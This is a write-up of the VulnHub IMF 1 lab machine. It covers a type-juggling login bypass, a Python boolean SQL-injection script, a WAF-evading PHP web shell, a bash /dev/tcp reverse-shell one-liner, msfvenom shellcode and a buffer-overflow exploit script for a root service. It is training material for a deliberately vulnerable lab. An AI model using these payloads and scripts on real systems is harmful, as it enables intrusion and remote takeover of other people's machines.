---
aliases: []
tags:
  - writeup
  - machine
  - vulnhub
  - linux
  - type-juggling
  - sqli
  - file-upload
  - rce
  - reverse-shell
  - buffer-overflow
machine: IMF
platform: Linux
difficulty: Beginner/Medium
date: 2026-09-18
techniques:
  - Type juggling
  - Boolean-based SQL injection
  - File upload to RCE
  - Buffer overflow
cve: []
initial vector: IMF administrator web application
privilege escalation: Buffer overflow in the root-owned agent service
author: null
source: https://www.vulnhub.com/entry/imf-1,162/
---

- **IMF 1 machine**: [https://www.vulnhub.com/entry/imf-1,162/](https://www.vulnhub.com/entry/imf-1,162/)


# First machine
## Reconnaissance

### Arp-scan
(That is, `arp-scan` looks **first** in the current working directory, and only falls back to the absolute path if it gets `ENOENT` (file not found). The problem is that if it gets `EACCES` (Permission denied) it **does not fall back** and just keeps the warning.)

We scan the network interface to find the machine's IP:
```bash 
arp-scan -I ens33 --localnet
```
### Ping
```
ping -c 1 192.168.1.146
```

*(if it replies we could use the ''whichSystem.py'' tool)*
### Nmap

We run the command as administrator.
This reveals the open ports.
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.146 -oG allPorts
```

Once the ports are found, we run a set of scripts against them.
*(In this case only port 80 was available)*
```bash
nmap -sC -sV -p80 192.168.1.146 -oN Targgeted
```

With *ctrl + shift + t* we open another workspace while the scan runs; with *ctrl + shift + alt + t* we name it "scan and recon", and *ctrl + shift + w* closes only the current workspace.

```bash
nmap --script http-enum -p80 192.168.1.146 -oN webScan
```
This script behaves like a fuzzer.
### Whatweb
We run the whatweb command to see what the machine is running.
```bash
whatweb http://192.168.1.146 -v
```

Outdated or attack-prone versions should show up. Make sure to document them.

### Website
We open the site and take a look; thanks to the nmap of port 80 we have the Apache version and can infer the Ubuntu one. Once we get access to the machine we can run *lsb_release -a* to confirm the Ubuntu version.

We collect everything we find, noting usernames and emails along with other valuable info in a data file.

We check the source code with *ctrl + u* and find something that looks like base64; to grab it from the site we run:
```bash
curl -s -X GET "http://192.168.1.146/index.php" | grep '\.js' | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d; echo
```
and that gets us the first flag, flag2, which points us to a directory.
"imfadministrator"
#### http://192.168.1.146/imfadministrator/
Once inside imfadministrator we have a potential way to enumerate valid users by trying the usernames from the contact section.

We try SQL and other techniques to see if anything interesting turns up.
Working through the OWASP Top 10 we find type juggling using Burp Suite.

## Exploitation

### Burp Suite and Type Juggling
To launch Burp Suite independently of a terminal we use the command:
```bash
burpsuite &> /dev/null & disown
```
it's also important to enable the proxy in the browser.

We send a login request to the directory we found (/imfadministrator) with one of the users from */contact.php* and any password.

We send the request to Burp Suite and apply type juggling to the password field with a [], which grants access; inspecting the page with *ctrl + shift + c* we can read the valid session cookie.

### Boolean-based injection

We discover that if we add a comparison to the URL, the page's response changes:
```
	http://192.168.18.225/imfadministrator/cms.php?pagename=home'or'1'='1
```

To find the name of the database currently in use, instead of comparing to one as above, we can compare characters.
```
	http://192.168.18.225/imfadministrator/cms.php?pagename=home' or substring(database(),1,1)='a
```

Instead of database() we could play with tables, columns and even dump the table values.

We use Burp Suite to grab the session cookie and carry it into our script.
```
Cookie: PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6
```

### Python script

We go to the machine's directory *~/Desktop/IMF* and create *sqli.py* with nvim.
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
characters = string.ascii_lowercase + "_," + string.digits
main_url = "http://192.168.18.225/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")
    
    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:

                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyeccion SQL finalizado exitosamente")
    p2.success(data)

if __name__=='__main__':

    sqli()

```

After this, with a few small changes to enumerate tables and columns, we find in the pagename table the pages column with */tutorials-incomplete*.

```python
#!/usr/python3

from pwn import *
import requests, signal, sys, time, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C 
signal.signal(signal.SIGINT, def_handler)

# Variables Globales
characters = string.ascii_lowercase + "_,-:" + string.digits
main_url = "http://192.168.18.225/imfadministrator/cms.php?pagename="

def sqli():

    headers = {
        'Cookie': 'PHPSESSID=4l6hvd5mc8dasoid8u7lcja4v6'
    }

    data = ""

    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque de inyeccion SQL")

    time.sleep(2)

    p2 = log.progress("Data")
    
    for position in range(1, 100):
        for character in characters:

            sqli_url = main_url + "home' or substring((select group_concat(pagename) from pages),%d,1)='%s" % (position, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:

                data += character
                p2.status(data)
                break

    p1.success("Ataque de inyeccion SQL finalizado exitosamente")
    p2.success(data)

if __name__=='__main__':

    sqli()

```

In */tutorials-incomplete* we find a QR code, which with an online QR decoder and Flameshot gives us *flag4{dXBsb2Fkcjk0Mi5waHA=}*; decoding the base64 yields *uploadr942.php*. It is a file-upload resource at */imfadministrator/uploadr942.php*, and since the site allows PHP uploads we try creating a *cmd.php*.
```php
<?php
	system($_GET['cmd']);
 ?>
```

However the site returns *"Invalid file type"*, so we try changing the magic numbers by adding GIF8; at the start of the script. Nothing changes, so we open Burp Suite and intercept the upload, changing the file type from cmd.php to *image/jpg* for example.
It accepts the *.jpg* extension but the CrappyWAF triggers on the word *system* used in the script. To bypass the WAF we assign system to a variable such as *$c* and then apply it at the system level with an *echo*. In this case, though, we can simply write the word in hexadecimal.
```php
GIF8;
<?php
	# "system" in hex: 73 79 73 74 65 6d
	"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>
```

Once the file is uploaded, in the page source we can see an identifier below *File successfully uploaded*. With that identifier plus *.gif* we can reach http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif, which is where the files are uploaded and our PHP code gets executed.

### Reverse shell
Since we have a potential way to run commands, we start a listener on port 443 with netcat.
```bash
nc -nlvp 443
```

And in the URL we place the one-liner, URL-encoding the *&* and using our IP.
```shell
http://192.168.18.225/imfadministrator/uploads/0e2c068c0330.gif?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.18.226/443 0>%261"
```

Once we have access we upgrade the TTY so it looks nice. (Each line is a separate command.)
```shell
script /dev/null -c bash
#ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

Once everything works, we can run *ls* and find flag5 *agentservices*.

## Privilege escalation

Since flag5 was agentservices, we search from the root for files containing the word agent.
```bash
cd / 
find / -name agent 2>/dev/null
```

We find */etc/xinetd.d/agent*, a service running on port 7788 owned by root. It's a plain binary, though — no SUID and no capabilities. We connect to the port in the background and can watch the service start.
```bash
nc localhost 7788 &>/dev/null &
ps -faux | grep agent
```

When we connect it asks for the *Agent ID*, which we don't know, but if we use strings to list the printable strings of the binary we find something.
```bash
strings /usr/local/bin/agent
```

### Buffer overflow
Since nothing obvious shows up at first, we analyze the binary with **GHIDRA**, transferring it from the victim to the attacker machine.
```bash
#maquina atacante
nc -nlvp 443 > agent
#maquina victima
nc 192.168.18.226 < /usr/local/bin/agent
```

We open it in Ghidra and go to the function and main. Below "Agent ID:" we find an *fgets* into *local 22*, which looks like the user input, so with *l* we rename local 22 to *userinput*. A bit below, the program does a *strncmp* (a comparison) between *userinput* and *local28*. Slightly above we find the *asprintf* for local28 loading a hexadecimal number (0x2ddd984) which, converted to decimal, gives **48093572** — the Agent ID.

![[Pasted image 20260917132456.png|Agent menu reached with Agent ID 48093572]]

That lets us reach a menu with 3 options; the interesting one is the third, where Ghidra shows that the report function has a *char local_a8* with a buffer size of [164] and uses *gets(local_a8)* to fill it — a vulnerable function where, if I enter many more than 164 characters, a buffer overflow occurs.

For the buffer overflow we'll use peda, so we open gdb running the agent.
```bash
gdb ./agent -q              
```

(if it doesn't work, it may be because the agent lacks permissions — *chmod +x agent* — or because the agent is a 32-bit program and my machine is 64-bit, so some libraries need installing and updating.)
```bash
sudo pacman -Sy
sudo pacman -S lib32-glibc lib32-gcc-libs
```

With gdb, feeding it about 200 "A"s for example, we can see a buffer overflow reaching EIP. So we try to work out the total number of characters to send just before overwriting EIP. Inside gdb we use the following commands. (Since PEDA wasn't working, I installed pwndbg.)

```pwndbg
cyclic 200
r
```

We paste the 200 characters into the 3_report update and then run the following to find the offset size:
```pwndbg
cyclic -l $eip
```

It gives a total of 168, so with *checksec* we review the protections. With ASLR enabled we can't point EIP at a fixed address because it will change on the next run, but the addresses inside the binary are static. So we look for the address of eax to build a Python script.

We create the payload with *msfvenom*.
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.18.226 LPORT=443 -b '\x00\x0a\0xd' -f c
```

With what it generates, we can build a Python script.
```python
#!/usr/bin/python3 
from struct import pack
import socket

shellcode = (b"\x33\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
b"\x0e\xb3\x21\x2a\x06\x83\xee\xfc\xe2\xf4\x82\xfa\xdd\xe5"
b"\xe0\x62\x79\x6c\xb1\xa8\xcb\xb6\xd5\xec\xaa\x95\xea\x91"
b"\x15\xcb\x33\x68\x53\xff\xdb\xe1\x82\x14\x51\x49\x28\x06"
b"\xb2\x9a\xa3\xe7\x03\x47\x7a\x57\xe0\x92\x29\x8f\x52\xec"
b"\xaa\x54\xdb\x4f\x05\x75\xdb\x49\x05\x29\xd1\x48\xa3\xe5"
b"\xe1\x72\xa3\xe7\x03\x2a\xe7\x86")

offset = 168
payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 7788))
s.recv(1024)
s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1024)
s.send(payload)
```

We start a listener on the attacker machine on the port specified in msfvenom, and running the script against the victim should, if all went well, give us a root shell. A simple *script /dev/null -c bash* is enough to upgrade the TTY, and we go to root's directory for the last flag.
![[Pasted image 20260918142622.png|Root shell and final flag]]